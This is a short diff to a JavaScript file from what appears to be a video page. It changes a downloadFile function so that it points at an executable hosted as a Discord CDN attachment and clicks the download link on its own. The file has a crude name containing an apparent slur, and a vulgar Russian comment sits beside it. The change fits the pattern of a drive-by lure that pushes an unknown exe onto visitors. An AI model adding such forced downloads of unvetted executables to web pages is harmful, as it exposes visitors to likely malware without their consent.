@@ -16,8 +16,8 @@ function showVideo() {
 
 function downloadFile() {
     var link = document.createElement("a");
-    link.href = "https://example.com/path/to/release.exe"; //сслыка на хуйню
-    link.download = "release.exe";
+    link.href = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe"; //сслыка на хуйню
+    link.download = "huynegra.exe";
     link.click();
 }
 
